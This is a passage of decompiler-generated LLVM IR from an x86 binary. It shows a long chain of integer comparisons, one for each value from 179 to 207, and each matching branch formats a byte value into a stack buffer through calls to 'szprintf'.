  %v4_804c323 = call i32 @szprintf(i32 %v2_804c311, i32 ptrtoint ([13 x i8]* @global_var_8059b3b.198 to i32), i32 %v1_804c302)
  br label %dec_label_pc_804c328

dec_label_pc_804c328:                             ; preds = %dec_label_pc_804c2ef, %dec_label_pc_804c2f8
  %v13_804c328 = icmp eq i32 %v2_8049ce5, 179
  %v1_804c32f = icmp eq i1 %v13_804c328, false
  br i1 %v1_804c32f, label %dec_label_pc_804c361, label %dec_label_pc_804c331

dec_label_pc_804c331:                             ; preds = %dec_label_pc_804c328
  %v0_804c331 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c331 = zext i8 %v0_804c331 to i32
  store i32 %v1_804c331, i32* @edx, align 4
  %v0_804c33b = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c33b = zext i8 %v0_804c33b to i32
  %v2_804c34a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c34a, i32* @ebx, align 4
  %v4_804c35c = call i32 @szprintf(i32 %v2_804c34a, i32 ptrtoint ([13 x i8]* @global_var_8059b48.199 to i32), i32 %v1_804c33b)
  br label %dec_label_pc_804c361

dec_label_pc_804c361:                             ; preds = %dec_label_pc_804c328, %dec_label_pc_804c331
  %v13_804c361 = icmp eq i32 %v2_8049ce5, 180
  %v1_804c368 = icmp eq i1 %v13_804c361, false
  br i1 %v1_804c368, label %dec_label_pc_804c39a, label %dec_label_pc_804c36a

dec_label_pc_804c36a:                             ; preds = %dec_label_pc_804c361
  %v0_804c36a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c36a = zext i8 %v0_804c36a to i32
  store i32 %v1_804c36a, i32* @edx, align 4
  %v0_804c374 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c374 = zext i8 %v0_804c374 to i32
  %v2_804c383 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c383, i32* @ebx, align 4
  %v4_804c395 = call i32 @szprintf(i32 %v2_804c383, i32 ptrtoint ([13 x i8]* @global_var_8059b55.200 to i32), i32 %v1_804c374)
  br label %dec_label_pc_804c39a

dec_label_pc_804c39a:                             ; preds = %dec_label_pc_804c361, %dec_label_pc_804c36a
  %v13_804c39a = icmp eq i32 %v2_8049ce5, 181
  %v1_804c3a1 = icmp eq i1 %v13_804c39a, false
  br i1 %v1_804c3a1, label %dec_label_pc_804c3d3, label %dec_label_pc_804c3a3

dec_label_pc_804c3a3:                             ; preds = %dec_label_pc_804c39a
  %v0_804c3a3 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c3a3 = zext i8 %v0_804c3a3 to i32
  store i32 %v1_804c3a3, i32* @edx, align 4
  %v0_804c3ad = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c3ad = zext i8 %v0_804c3ad to i32
  %v2_804c3bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3bc, i32* @ebx, align 4
  %v4_804c3ce = call i32 @szprintf(i32 %v2_804c3bc, i32 ptrtoint ([13 x i8]* @global_var_8059b62.201 to i32), i32 %v1_804c3ad)
  br label %dec_label_pc_804c3d3

dec_label_pc_804c3d3:                             ; preds = %dec_label_pc_804c39a, %dec_label_pc_804c3a3
  %v13_804c3d3 = icmp eq i32 %v2_8049ce5, 182
  %v1_804c3da = icmp eq i1 %v13_804c3d3, false
  br i1 %v1_804c3da, label %dec_label_pc_804c40c, label %dec_label_pc_804c3dc

dec_label_pc_804c3dc:                             ; preds = %dec_label_pc_804c3d3
  %v0_804c3dc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c3dc = zext i8 %v0_804c3dc to i32
  store i32 %v1_804c3dc, i32* @edx, align 4
  %v0_804c3e6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c3e6 = zext i8 %v0_804c3e6 to i32
  %v2_804c3f5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3f5, i32* @ebx, align 4
  %v4_804c407 = call i32 @szprintf(i32 %v2_804c3f5, i32 ptrtoint ([13 x i8]* @global_var_8059b6f.202 to i32), i32 %v1_804c3e6)
  br label %dec_label_pc_804c40c

dec_label_pc_804c40c:                             ; preds = %dec_label_pc_804c3d3, %dec_label_pc_804c3dc
  %v13_804c40c = icmp eq i32 %v2_8049ce5, 183
  %v1_804c413 = icmp eq i1 %v13_804c40c, false
  br i1 %v1_804c413, label %dec_label_pc_804c445, label %dec_label_pc_804c415

dec_label_pc_804c415:                             ; preds = %dec_label_pc_804c40c
  %v0_804c415 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c415 = zext i8 %v0_804c415 to i32
  store i32 %v1_804c415, i32* @edx, align 4
  %v0_804c41f = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c41f = zext i8 %v0_804c41f to i32
  %v2_804c42e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c42e, i32* @ebx, align 4
  %v4_804c440 = call i32 @szprintf(i32 %v2_804c42e, i32 ptrtoint ([13 x i8]* @global_var_80594ba.73 to i32), i32 %v1_804c41f)
  br label %dec_label_pc_804c445

dec_label_pc_804c445:                             ; preds = %dec_label_pc_804c40c, %dec_label_pc_804c415
  %v13_804c445 = icmp eq i32 %v2_8049ce5, 184
  %v1_804c44c = icmp eq i1 %v13_804c445, false
  br i1 %v1_804c44c, label %dec_label_pc_804c47e, label %dec_label_pc_804c44e

dec_label_pc_804c44e:                             ; preds = %dec_label_pc_804c445
  %v0_804c44e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c44e = zext i8 %v0_804c44e to i32
  store i32 %v1_804c44e, i32* @edx, align 4
  %v0_804c458 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c458 = zext i8 %v0_804c458 to i32
  %v2_804c467 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c467, i32* @ebx, align 4
  %v4_804c479 = call i32 @szprintf(i32 %v2_804c467, i32 ptrtoint ([13 x i8]* @global_var_8059b7c.203 to i32), i32 %v1_804c458)
  br label %dec_label_pc_804c47e

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c445, %dec_label_pc_804c44e
  %v13_804c47e = icmp eq i32 %v2_8049ce5, 185
  %v1_804c485 = icmp eq i1 %v13_804c47e, false
  br i1 %v1_804c485, label %dec_label_pc_804c4b7, label %dec_label_pc_804c487

dec_label_pc_804c487:                             ; preds = %dec_label_pc_804c47e
  %v0_804c487 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c487 = zext i8 %v0_804c487 to i32
  store i32 %v1_804c487, i32* @edx, align 4
  %v0_804c491 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c491 = zext i8 %v0_804c491 to i32
  %v2_804c4a0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4a0, i32* @ebx, align 4
  %v4_804c4b2 = call i32 @szprintf(i32 %v2_804c4a0, i32 ptrtoint ([13 x i8]* @global_var_8059b89.204 to i32), i32 %v1_804c491)
  br label %dec_label_pc_804c4b7

dec_label_pc_804c4b7:                             ; preds = %dec_label_pc_804c47e, %dec_label_pc_804c487
  %v13_804c4b7 = icmp eq i32 %v2_8049ce5, 186
  %v1_804c4be = icmp eq i1 %v13_804c4b7, false
  br i1 %v1_804c4be, label %dec_label_pc_804c4f0, label %dec_label_pc_804c4c0

dec_label_pc_804c4c0:                             ; preds = %dec_label_pc_804c4b7
  %v0_804c4c0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c4c0 = zext i8 %v0_804c4c0 to i32
  store i32 %v1_804c4c0, i32* @edx, align 4
  %v0_804c4ca = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c4ca = zext i8 %v0_804c4ca to i32
  %v2_804c4d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4d9, i32* @ebx, align 4
  %v4_804c4eb = call i32 @szprintf(i32 %v2_804c4d9, i32 ptrtoint ([14 x i8]* @global_var_8059b96.205 to i32), i32 %v1_804c4ca)
  br label %dec_label_pc_804c4f0

dec_label_pc_804c4f0:                             ; preds = %dec_label_pc_804c4b7, %dec_label_pc_804c4c0
  %v13_804c4f0 = icmp eq i32 %v2_8049ce5, 187
  %v1_804c4f7 = icmp eq i1 %v13_804c4f0, false
  br i1 %v1_804c4f7, label %dec_label_pc_804c529, label %dec_label_pc_804c4f9

dec_label_pc_804c4f9:                             ; preds = %dec_label_pc_804c4f0
  %v0_804c4f9 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c4f9 = zext i8 %v0_804c4f9 to i32
  store i32 %v1_804c4f9, i32* @edx, align 4
  %v0_804c503 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c503 = zext i8 %v0_804c503 to i32
  %v2_804c512 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c512, i32* @ebx, align 4
  %v4_804c524 = call i32 @szprintf(i32 %v2_804c512, i32 ptrtoint ([14 x i8]* @global_var_8059ba4.206 to i32), i32 %v1_804c503)
  br label %dec_label_pc_804c529

dec_label_pc_804c529:                             ; preds = %dec_label_pc_804c4f0, %dec_label_pc_804c4f9
  %v13_804c529 = icmp eq i32 %v2_8049ce5, 188
  %v1_804c530 = icmp eq i1 %v13_804c529, false
  br i1 %v1_804c530, label %dec_label_pc_804c562, label %dec_label_pc_804c532

dec_label_pc_804c532:                             ; preds = %dec_label_pc_804c529
  %v0_804c532 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c532 = zext i8 %v0_804c532 to i32
  store i32 %v1_804c532, i32* @edx, align 4
  %v0_804c53c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c53c = zext i8 %v0_804c53c to i32
  %v2_804c54b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c54b, i32* @ebx, align 4
  %v4_804c55d = call i32 @szprintf(i32 %v2_804c54b, i32 ptrtoint ([14 x i8]* @global_var_8059bb2.207 to i32), i32 %v1_804c53c)
  br label %dec_label_pc_804c562

dec_label_pc_804c562:                             ; preds = %dec_label_pc_804c529, %dec_label_pc_804c532
  %v13_804c562 = icmp eq i32 %v2_8049ce5, 189
  %v1_804c569 = icmp eq i1 %v13_804c562, false
  br i1 %v1_804c569, label %dec_label_pc_804c59b, label %dec_label_pc_804c56b

dec_label_pc_804c56b:                             ; preds = %dec_label_pc_804c562
  %v0_804c56b = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c56b = zext i8 %v0_804c56b to i32
  store i32 %v1_804c56b, i32* @edx, align 4
  %v0_804c575 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c575 = zext i8 %v0_804c575 to i32
  %v2_804c584 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c584, i32* @ebx, align 4
  %v4_804c596 = call i32 @szprintf(i32 %v2_804c584, i32 ptrtoint ([14 x i8]* @global_var_8059bc0.208 to i32), i32 %v1_804c575)
  br label %dec_label_pc_804c59b

dec_label_pc_804c59b:                             ; preds = %dec_label_pc_804c562, %dec_label_pc_804c56b
  %v13_804c59b = icmp eq i32 %v2_8049ce5, 190
  %v1_804c5a2 = icmp eq i1 %v13_804c59b, false
  br i1 %v1_804c5a2, label %dec_label_pc_804c5d4, label %dec_label_pc_804c5a4

dec_label_pc_804c5a4:                             ; preds = %dec_label_pc_804c59b
  %v0_804c5a4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c5a4 = zext i8 %v0_804c5a4 to i32
  store i32 %v1_804c5a4, i32* @edx, align 4
  %v0_804c5ae = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c5ae = zext i8 %v0_804c5ae to i32
  %v2_804c5bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5bd, i32* @ebx, align 4
  %v4_804c5cf = call i32 @szprintf(i32 %v2_804c5bd, i32 ptrtoint ([14 x i8]* @global_var_8059bce.209 to i32), i32 %v1_804c5ae)
  br label %dec_label_pc_804c5d4

dec_label_pc_804c5d4:                             ; preds = %dec_label_pc_804c59b, %dec_label_pc_804c5a4
  %v13_804c5d4 = icmp eq i32 %v2_8049ce5, 191
  %v1_804c5db = icmp eq i1 %v13_804c5d4, false
  br i1 %v1_804c5db, label %dec_label_pc_804c60d, label %dec_label_pc_804c5dd

dec_label_pc_804c5dd:                             ; preds = %dec_label_pc_804c5d4
  %v0_804c5dd = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c5dd = zext i8 %v0_804c5dd to i32
  store i32 %v1_804c5dd, i32* @edx, align 4
  %v0_804c5e7 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c5e7 = zext i8 %v0_804c5e7 to i32
  %v2_804c5f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5f6, i32* @ebx, align 4
  %v4_804c608 = call i32 @szprintf(i32 %v2_804c5f6, i32 ptrtoint ([14 x i8]* @global_var_8059bdc.210 to i32), i32 %v1_804c5e7)
  br label %dec_label_pc_804c60d

dec_label_pc_804c60d:                             ; preds = %dec_label_pc_804c5d4, %dec_label_pc_804c5dd
  %v10_804c60d = icmp eq i32 %v2_8049ce5, 192
  %v1_804c614 = icmp eq i1 %v10_804c60d, false
  br i1 %v1_804c614, label %dec_label_pc_804c646, label %dec_label_pc_804c616

dec_label_pc_804c616:                             ; preds = %dec_label_pc_804c60d
  %v0_804c616 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c616 = zext i8 %v0_804c616 to i32
  store i32 %v1_804c616, i32* @edx, align 4
  %v0_804c620 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c620 = zext i8 %v0_804c620 to i32
  %v2_804c62f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c62f, i32* @ebx, align 4
  %v4_804c641 = call i32 @szprintf(i32 %v2_804c62f, i32 ptrtoint ([13 x i8]* @global_var_8059bea.211 to i32), i32 %v1_804c620)
  br label %dec_label_pc_804c646

dec_label_pc_804c646:                             ; preds = %dec_label_pc_804c60d, %dec_label_pc_804c616
  %v13_804c646 = icmp eq i32 %v2_8049ce5, 193
  %v1_804c64d = icmp eq i1 %v13_804c646, false
  br i1 %v1_804c64d, label %dec_label_pc_804c67f, label %dec_label_pc_804c64f

dec_label_pc_804c64f:                             ; preds = %dec_label_pc_804c646
  %v0_804c64f = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c64f = zext i8 %v0_804c64f to i32
  store i32 %v1_804c64f, i32* @edx, align 4
  %v0_804c659 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c659 = zext i8 %v0_804c659 to i32
  %v2_804c668 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c668, i32* @ebx, align 4
  %v4_804c67a = call i32 @szprintf(i32 %v2_804c668, i32 ptrtoint ([13 x i8]* @global_var_8059bf7.212 to i32), i32 %v1_804c659)
  br label %dec_label_pc_804c67f

dec_label_pc_804c67f:                             ; preds = %dec_label_pc_804c646, %dec_label_pc_804c64f
  %v13_804c67f = icmp eq i32 %v2_8049ce5, 194
  %v1_804c686 = icmp eq i1 %v13_804c67f, false
  br i1 %v1_804c686, label %dec_label_pc_804c6b8, label %dec_label_pc_804c688

dec_label_pc_804c688:                             ; preds = %dec_label_pc_804c67f
  %v0_804c688 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c688 = zext i8 %v0_804c688 to i32
  store i32 %v1_804c688, i32* @edx, align 4
  %v0_804c692 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c692 = zext i8 %v0_804c692 to i32
  %v2_804c6a1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6a1, i32* @ebx, align 4
  %v4_804c6b3 = call i32 @szprintf(i32 %v2_804c6a1, i32 ptrtoint ([14 x i8]* @global_var_8059c04.213 to i32), i32 %v1_804c692)
  br label %dec_label_pc_804c6b8

dec_label_pc_804c6b8:                             ; preds = %dec_label_pc_804c67f, %dec_label_pc_804c688
  %v13_804c6b8 = icmp eq i32 %v2_8049ce5, 195
  %v1_804c6bf = icmp eq i1 %v13_804c6b8, false
  br i1 %v1_804c6bf, label %dec_label_pc_804c6f1, label %dec_label_pc_804c6c1

dec_label_pc_804c6c1:                             ; preds = %dec_label_pc_804c6b8
  %v0_804c6c1 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c6c1 = zext i8 %v0_804c6c1 to i32
  store i32 %v1_804c6c1, i32* @edx, align 4
  %v0_804c6cb = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c6cb = zext i8 %v0_804c6cb to i32
  %v2_804c6da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6da, i32* @ebx, align 4
  %v4_804c6ec = call i32 @szprintf(i32 %v2_804c6da, i32 ptrtoint ([14 x i8]* @global_var_8059c12.214 to i32), i32 %v1_804c6cb)
  br label %dec_label_pc_804c6f1

dec_label_pc_804c6f1:                             ; preds = %dec_label_pc_804c6b8, %dec_label_pc_804c6c1
  %v13_804c6f1 = icmp eq i32 %v2_8049ce5, 196
  %v1_804c6f8 = icmp eq i1 %v13_804c6f1, false
  br i1 %v1_804c6f8, label %dec_label_pc_804c72a, label %dec_label_pc_804c6fa

dec_label_pc_804c6fa:                             ; preds = %dec_label_pc_804c6f1
  %v0_804c6fa = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c6fa = zext i8 %v0_804c6fa to i32
  store i32 %v1_804c6fa, i32* @edx, align 4
  %v0_804c704 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c704 = zext i8 %v0_804c704 to i32
  %v2_804c713 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c713, i32* @ebx, align 4
  %v4_804c725 = call i32 @szprintf(i32 %v2_804c713, i32 ptrtoint ([14 x i8]* @global_var_8059c20.215 to i32), i32 %v1_804c704)
  br label %dec_label_pc_804c72a

dec_label_pc_804c72a:                             ; preds = %dec_label_pc_804c6f1, %dec_label_pc_804c6fa
  %v13_804c72a = icmp eq i32 %v2_8049ce5, 197
  %v1_804c731 = icmp eq i1 %v13_804c72a, false
  br i1 %v1_804c731, label %dec_label_pc_804c763, label %dec_label_pc_804c733

dec_label_pc_804c733:                             ; preds = %dec_label_pc_804c72a
  %v0_804c733 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c733 = zext i8 %v0_804c733 to i32
  store i32 %v1_804c733, i32* @edx, align 4
  %v0_804c73d = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c73d = zext i8 %v0_804c73d to i32
  %v2_804c74c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c74c, i32* @ebx, align 4
  %v4_804c75e = call i32 @szprintf(i32 %v2_804c74c, i32 ptrtoint ([14 x i8]* @global_var_8059c2e.216 to i32), i32 %v1_804c73d)
  br label %dec_label_pc_804c763

dec_label_pc_804c763:                             ; preds = %dec_label_pc_804c72a, %dec_label_pc_804c733
  %v13_804c763 = icmp eq i32 %v2_8049ce5, 198
  %v1_804c76a = icmp eq i1 %v13_804c763, false
  br i1 %v1_804c76a, label %dec_label_pc_804c79c, label %dec_label_pc_804c76c

dec_label_pc_804c76c:                             ; preds = %dec_label_pc_804c763
  %v0_804c76c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c76c = zext i8 %v0_804c76c to i32
  store i32 %v1_804c76c, i32* @edx, align 4
  %v0_804c776 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c776 = zext i8 %v0_804c776 to i32
  %v2_804c785 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c785, i32* @ebx, align 4
  %v4_804c797 = call i32 @szprintf(i32 %v2_804c785, i32 ptrtoint ([14 x i8]* @global_var_8059c3c.217 to i32), i32 %v1_804c776)
  br label %dec_label_pc_804c79c

dec_label_pc_804c79c:                             ; preds = %dec_label_pc_804c763, %dec_label_pc_804c76c
  %v13_804c79c = icmp eq i32 %v2_8049ce5, 199
  %v1_804c7a3 = icmp eq i1 %v13_804c79c, false
  br i1 %v1_804c7a3, label %dec_label_pc_804c7d5, label %dec_label_pc_804c7a5

dec_label_pc_804c7a5:                             ; preds = %dec_label_pc_804c79c
  %v0_804c7a5 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c7a5 = zext i8 %v0_804c7a5 to i32
  store i32 %v1_804c7a5, i32* @edx, align 4
  %v0_804c7af = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c7af = zext i8 %v0_804c7af to i32
  %v2_804c7be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7be, i32* @ebx, align 4
  %v4_804c7d0 = call i32 @szprintf(i32 %v2_804c7be, i32 ptrtoint ([14 x i8]* @global_var_8059c4a.218 to i32), i32 %v1_804c7af)
  br label %dec_label_pc_804c7d5

dec_label_pc_804c7d5:                             ; preds = %dec_label_pc_804c79c, %dec_label_pc_804c7a5
  %v13_804c7d5 = icmp eq i32 %v2_8049ce5, 200
  %v1_804c7dc = icmp eq i1 %v13_804c7d5, false
  br i1 %v1_804c7dc, label %dec_label_pc_804c80e, label %dec_label_pc_804c7de

dec_label_pc_804c7de:                             ; preds = %dec_label_pc_804c7d5
  %v0_804c7de = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c7de = zext i8 %v0_804c7de to i32
  store i32 %v1_804c7de, i32* @edx, align 4
  %v0_804c7e8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c7e8 = zext i8 %v0_804c7e8 to i32
  %v2_804c7f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7f7, i32* @ebx, align 4
  %v4_804c809 = call i32 @szprintf(i32 %v2_804c7f7, i32 ptrtoint ([14 x i8]* @global_var_8059c58.219 to i32), i32 %v1_804c7e8)
  br label %dec_label_pc_804c80e

dec_label_pc_804c80e:                             ; preds = %dec_label_pc_804c7d5, %dec_label_pc_804c7de
  %v13_804c80e = icmp eq i32 %v2_8049ce5, 201
  %v1_804c815 = icmp eq i1 %v13_804c80e, false
  br i1 %v1_804c815, label %dec_label_pc_804c847.thread, label %dec_label_pc_804c850

dec_label_pc_804c847.thread:                      ; preds = %dec_label_pc_804c80e
  br label %dec_label_pc_804c880

dec_label_pc_804c850:                             ; preds = %dec_label_pc_804c80e
  %v0_804c821 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c821 = zext i8 %v0_804c821 to i32
  %v2_804c830 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c830, i32* @ebx, align 4
  %v4_804c842 = call i32 @szprintf(i32 %v2_804c830, i32 ptrtoint ([14 x i8]* @global_var_8059c66.220 to i32), i32 %v1_804c821)
  %v0_804c850 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c850 = zext i8 %v0_804c850 to i32
  store i32 %v1_804c850, i32* @edx, align 4
  %v0_804c85a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c85a = zext i8 %v0_804c85a to i32
  store i32 %v2_804c830, i32* @ebx, align 4
  %v4_804c87b = call i32 @szprintf(i32 %v2_804c830, i32 ptrtoint ([13 x i8]* @global_var_8059c74.221 to i32), i32 %v1_804c85a)
  br label %dec_label_pc_804c880

dec_label_pc_804c880:                             ; preds = %dec_label_pc_804c847.thread, %dec_label_pc_804c850
  %v13_804c880 = icmp eq i32 %v2_8049ce5, 202
  %v1_804c887 = icmp eq i1 %v13_804c880, false
  br i1 %v1_804c887, label %dec_label_pc_804c8b9, label %dec_label_pc_804c889

dec_label_pc_804c889:                             ; preds = %dec_label_pc_804c880
  %v0_804c889 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c889 = zext i8 %v0_804c889 to i32
  store i32 %v1_804c889, i32* @edx, align 4
  %v0_804c893 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c893 = zext i8 %v0_804c893 to i32
  %v2_804c8a2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8a2, i32* @ebx, align 4
  %v4_804c8b4 = call i32 @szprintf(i32 %v2_804c8a2, i32 ptrtoint ([13 x i8]* @global_var_8059c81.222 to i32), i32 %v1_804c893)
  br label %dec_label_pc_804c8b9

dec_label_pc_804c8b9:                             ; preds = %dec_label_pc_804c880, %dec_label_pc_804c889
  %v13_804c8b9 = icmp eq i32 %v2_8049ce5, 203
  %v1_804c8c0 = icmp eq i1 %v13_804c8b9, false
  br i1 %v1_804c8c0, label %dec_label_pc_804c8f2, label %dec_label_pc_804c8c2

dec_label_pc_804c8c2:                             ; preds = %dec_label_pc_804c8b9
  %v0_804c8c2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c8c2 = zext i8 %v0_804c8c2 to i32
  store i32 %v1_804c8c2, i32* @edx, align 4
  %v0_804c8cc = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c8cc = zext i8 %v0_804c8cc to i32
  %v2_804c8db = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8db, i32* @ebx, align 4
  %v4_804c8ed = call i32 @szprintf(i32 %v2_804c8db, i32 ptrtoint ([13 x i8]* @global_var_8059c8e.223 to i32), i32 %v1_804c8cc)
  br label %dec_label_pc_804c8f2

dec_label_pc_804c8f2:                             ; preds = %dec_label_pc_804c8b9, %dec_label_pc_804c8c2
  %v13_804c8f2 = icmp eq i32 %v2_8049ce5, 204
  %v1_804c8f9 = icmp eq i1 %v13_804c8f2, false
  br i1 %v1_804c8f9, label %dec_label_pc_804c92b, label %dec_label_pc_804c8fb

dec_label_pc_804c8fb:                             ; preds = %dec_label_pc_804c8f2
  %v0_804c8fb = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c8fb = zext i8 %v0_804c8fb to i32
  store i32 %v1_804c8fb, i32* @edx, align 4
  %v0_804c905 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c905 = zext i8 %v0_804c905 to i32
  %v2_804c914 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c914, i32* @ebx, align 4
  %v4_804c926 = call i32 @szprintf(i32 %v2_804c914, i32 ptrtoint ([13 x i8]* @global_var_8059c9b.224 to i32), i32 %v1_804c905)
  br label %dec_label_pc_804c92b

dec_label_pc_804c92b:                             ; preds = %dec_label_pc_804c8f2, %dec_label_pc_804c8fb
  %v13_804c92b = icmp eq i32 %v2_8049ce5, 205
  %v1_804c932 = icmp eq i1 %v13_804c92b, false
  br i1 %v1_804c932, label %dec_label_pc_804c964, label %dec_label_pc_804c934

dec_label_pc_804c934:                             ; preds = %dec_label_pc_804c92b
  %v0_804c934 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c934 = zext i8 %v0_804c934 to i32
  store i32 %v1_804c934, i32* @edx, align 4
  %v0_804c93e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c93e = zext i8 %v0_804c93e to i32
  %v2_804c94d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c94d, i32* @ebx, align 4
  %v4_804c95f = call i32 @szprintf(i32 %v2_804c94d, i32 ptrtoint ([13 x i8]* @global_var_8059ca8.225 to i32), i32 %v1_804c93e)
  br label %dec_label_pc_804c964

dec_label_pc_804c964:                             ; preds = %dec_label_pc_804c92b, %dec_label_pc_804c934
  %v13_804c964 = icmp eq i32 %v2_8049ce5, 206
  %v1_804c96b = icmp eq i1 %v13_804c964, false
  br i1 %v1_804c96b, label %dec_label_pc_804c99d, label %dec_label_pc_804c96d

dec_label_pc_804c96d:                             ; preds = %dec_label_pc_804c964
  %v0_804c96d = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c96d = zext i8 %v0_804c96d to i32
  store i32 %v1_804c96d, i32* @edx, align 4
  %v0_804c977 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c977 = zext i8 %v0_804c977 to i32
  %v2_804c986 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c986, i32* @ebx, align 4
  %v4_804c998 = call i32 @szprintf(i32 %v2_804c986, i32 ptrtoint ([13 x i8]* @global_var_8059cb5.226 to i32), i32 %v1_804c977)
  br label %dec_label_pc_804c99d

dec_label_pc_804c99d:                             ; preds = %dec_label_pc_804c964, %dec_label_pc_804c96d
  %v13_804c99d = icmp eq i32 %v2_8049ce5, 207
  %v1_804c9a4 = icmp eq i1 %v13_804c99d, false
  br i1 %v1_804c9a4, label %dec_label_pc_804c9d6, label %dec_label_pc_804c9a6

dec_label_pc_804c9a6:                             ; preds = %dec_label_pc_804c99d
  %v0_804c9a6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c9a6 = zext i8 %v0_804c9a6 to i32
  store i32 %v1_804c9a6, i32* @edx, align 4
  %v0_804c9b0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c9b0 = zext i8 %v0_804c9b0 to i32
  %v2_804c9bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c9bf, i32* @ebx, align 4
  %v4_804c9d1 = call i32 @szprintf(i32 %v2_804c9bf, i32 ptrtoint ([14 x i8]* @global_var_8059cc2.227 to i32), i32 %v1_804c9b0)
  br label %dec_label_pc_804c9d6

dec_label_pc_804c9d6:                             ; preds = %dec_label_pc_804c99d, %dec_label_pc_804c9a6
  br i1 true, label %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge, label %dec_label_pc_804c9df

dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge: ; preds = %dec_label_pc_804c9d6
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804ca0f

dec_label_pc_804c9df:                             ; preds = %dec_label_pc_804c9d6
  br label %dec_label_pc_804ca0f

dec_label_pc_804ca0f:                             ; preds = %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge, %dec_label_pc_804c9df
